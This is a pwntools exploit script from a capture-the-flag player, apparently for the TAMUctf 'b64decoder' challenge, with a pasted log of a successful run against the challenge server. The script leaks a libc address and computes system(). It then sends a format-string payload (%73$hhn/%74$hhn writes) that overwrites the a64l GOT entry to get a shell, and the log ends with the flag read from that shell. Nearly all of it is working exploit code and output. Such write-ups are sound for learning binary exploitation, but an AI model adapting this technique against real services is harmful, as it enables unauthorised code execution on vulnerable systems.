#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# /ahpaleus/

from pwn import *

# local_libc = '/lib32/libc.so.6'
task_libc = './libc.so.6'

local_libc = task_libc
env = {'LD_PRELOAD': task_libc}

libc = ELF(local_libc)
exe = context.binary = ELF('./b64decoder')

context.terminal = ['tmux', 'splitw', '-h']

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
    	return remote('challenges.tamuctf.com', 2783)
    elif args.LOCAL:
        return process([exe.path], env=env)

gdbscript = '''
set follow-fork-mode parent
tbreak main
break *0x8049290
continue
c
'''.format(**locals())

io = start()
libc = ELF(local_libc)
print(io.recvuntil('a64l ('))

a64l_address = int(io.recvuntil(')')[:-1],16)
print('[*] leaked a64l_address: ' + hex(a64l_address))
io.recvuntil('name!')

libc_a64l = libc.symbols['a64l'] # $ nm -D /lib32/libc.so.6 | grep a64l
print('[*] a64l (libc): ' + hex(libc_a64l))

base_libc = a64l_address - libc_a64l
system_libc = base_libc + libc.symbols['system']

print('[*] system (libc): ' + hex(system_libc)) 
a64l_pointer_plt = 0x804b398 # <- rw
print('[*] a64l pointer: ' + hex(a64l_pointer_plt))

exploit  = b'%73$hhn' + b'a'
exploit += b'\x98\xb3\x04\x08'
exploit += b'\x99\xb3\x04\x08'
exploit += '%{}x'.format(((system_libc >> 8) & 0xff) - 0x9).encode()
exploit += b'%74$hhn'

print('[*] exploit = ' + str(exploit))

io.sendline(exploit)

print('[*] payload length: ' + str(len(exploit)))

io.interactive()

'''
junior@junior:/mnt/hgfs/LEARN/tamuctf/b64decoder$ python3 exploit3.py REMOTE
[*] '/mnt/hgfs/LEARN/tamuctf/b64decoder/libc.so.6'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/mnt/hgfs/LEARN/tamuctf/b64decoder/b64decoder'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Opening connection to challenges.tamuctf.com on port 2783: Done
b"Base64 is an encoding that represents binary data in ASCII string format.\nEach number from 0 to 63 is mapped to an ASCII character.  For example, 'z' is 63\nBase64 Decoder: Powered by a64l ("
[*] leaked a64l_address: 0xf7e2b290
[*] a64l (libc): 0x3f290
[*] system (libc): 0xf7e2ac00
[*] a64l pointer: 0x804b398
[*] exploit = b'%73$hhna\x98\xb3\x04\x08\x99\xb3\x04\x08%163x%74$hhn'
[*] Switching to interactive mode

Welcome, a\x98\xb3\x04\x99\xb3\x04                                                                                                                                                                 20

$ cat flag.txt
gigem{b1n5h_1n_b45364?}Please enter input to be decoded:
0
$

'''


